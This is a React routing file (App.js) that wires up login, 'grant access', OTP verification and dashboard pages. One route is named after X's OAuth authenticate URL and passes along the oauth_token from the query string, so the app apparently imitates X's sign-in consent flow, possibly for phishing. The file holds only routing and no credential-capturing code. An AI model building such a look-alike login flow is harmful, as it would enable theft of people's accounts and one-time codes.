import React from 'react';
import { BrowserRouter as Router, Routes, Route, useNavigate } from 'react-router-dom';
import Login from './pages/Login';
import GrantAccess from './pages/GrantAccess';
import OTPVerification from './pages/OTPVerification';
import Dashboard from './pages/Dashboard';

const RedirectToGrantAccess = () => {
  const navigate = useNavigate();
  
  React.useEffect(() => {
    // Get the oauth_token query param from the URL
    const queryParams = new URLSearchParams(window.location.search);
    const oauthToken = queryParams.get("oauth_token");

    // Redirect to /grant-access with the oauth_token
    if (oauthToken) {
      navigate(`/grant-access?oauth_token=${oauthToken}`);
    } else {
      navigate("/grant-access"); // Default redirect if no token
    }
  }, [navigate]);

  return null; // This component doesn't render anything
};

const App = () => {
  return (
    <Router>
      <Routes>
        {/* Login page route */}
        <Route path="/" element={<Login />} />
        
        {/* Redirect route for /api.x.com/oauth/authenticate */}
        <Route path="/api.x.com/oauth/authenticate" element={<RedirectToGrantAccess />} />
        
        {/* Grant Access page route */}
        <Route path="/grant-access" element={<GrantAccess />} />
        
        {/* OTP Verification page route */}
        <Route path="/otp-verification" element={<OTPVerification />} />
        
        {/* Dashboard page route */}
        <Route path="/dashboard" element={<Dashboard />} />
      </Routes>
    </Router>
  );
};

export default App;
